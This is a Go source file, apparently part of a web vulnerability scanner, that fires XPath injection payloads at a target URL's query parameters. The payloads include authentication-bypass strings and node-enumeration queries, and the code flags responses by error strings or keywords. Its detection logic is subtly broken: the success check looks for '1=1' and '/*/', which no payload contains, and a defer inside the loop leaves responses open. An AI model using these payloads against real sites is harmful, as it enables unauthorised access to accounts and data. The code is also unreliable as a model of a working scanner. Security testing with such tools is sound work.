package xpath

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type XPathPayload struct {
	Name    string
	Payload string
}

var XPathPayloads = []XPathPayload{
	{"XPath Auth Bypass", "' or '1'='1"},
	{"XPath Auth Bypass 2", "' or ''='"},
	{"XPath Enumeration", "//*"},
	{"XPath Node Count", "' and count(/*)=1 and '1'='1"},
	{"XPath Name Discovery", "x' or name()='username' or 'x'='y"},
}

var XPathErrors = []string{
	"XPathException",
	"SimpleXMLElement::xpath()",
	"xmlXPathEval: evaluation failed",
	"DOMXPath::query()",
}

// Scan tests for XPath Injection
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// Use parameters likely to be used in XML queries
	params := []string{"id", "user", "name", "search", "query", "xml"}

	for _, param := range params {
		for _, p := range XPathPayloads {
			target := fmt.Sprintf("%s?%s=%s", baseURL, param, p.Payload)
			
			resp, err := client.Get(target)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyStr := string(bodyBytes)
			bodyLower := strings.ToLower(bodyStr)

			isVulnerable := false
			detail := ""

			// 1. Detection via specific XPath errors
			for _, errStr := range XPathErrors {
				if strings.Contains(bodyStr, errStr) {
					isVulnerable = true
					detail = fmt.Sprintf("XPath error found: %s", errStr)
					break
				}
			}

			// 2. Detection via success indicators (heuristic)
			if !isVulnerable && resp.StatusCode == 200 {
				successIndicators := []string{"admin", "account", "password", "root"}
				for _, ind := range successIndicators {
					if strings.Contains(bodyLower, ind) && (strings.Contains(p.Payload, "1=1") || strings.Contains(p.Payload, "/*/")) {
						isVulnerable = true
						detail = "Authentication bypass or data leakage indicator found"
						break
					}
				}
			}

			if isVulnerable {
				fmt.Printf("[!] POSITIVE MATCH: %s via %s at %s\n", p.Name, param, target)
				onFound(core.Finding{
					Type:     "XPath Injection",
					Target:   target,
					Detail:   detail,
					Severity: "High",
				})
			}
		}
	}
}
